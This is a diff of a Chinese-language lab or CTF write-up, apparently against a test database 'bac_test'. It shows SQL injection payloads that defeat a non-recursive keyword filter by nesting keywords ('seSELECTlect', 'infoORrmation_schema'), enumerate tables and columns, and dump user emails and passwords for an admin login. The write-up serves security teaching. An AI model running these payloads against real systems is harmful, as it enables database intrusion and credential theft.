@@ -226,7 +226,7 @@ gold=1,country="SESELECTLECT"
 ![SQL注入成功](images/image14.png)
 
 
-成功绕过过滤。
+成功绕过过滤（说明并没有使用递归过滤）。
 
 获取数据库：
 
@@ -237,27 +237,28 @@ bac_test
 ![数据库枚举](images/image15.png)
 
 枚举表
+
 gold=1,country=(seSELECTlect group_concat(table_name) from infoORrmation_schema.tables WHERE table_schema='bac_test')
 
 得到：
 
 users
+
 枚举字段
+
 gold=1,country=(seSELECTlect group_concat(column_name) from infoORrmation_schema.columns WHERE table_name='users')
 
 得到字段：
 
 email
 password
+
 获取用户数据
+
 gold=1,country=(seSELECTlect group_concat(email,':',passwoORrd) from bac_test.users)
 
 成功获取管理员账号密码。
 
-📷 截图位置
-
-images/user_dump.png
-![用户数据](images/user_dump.png)
 十、管理员后台登录
 
 使用获取的账户登录后台。
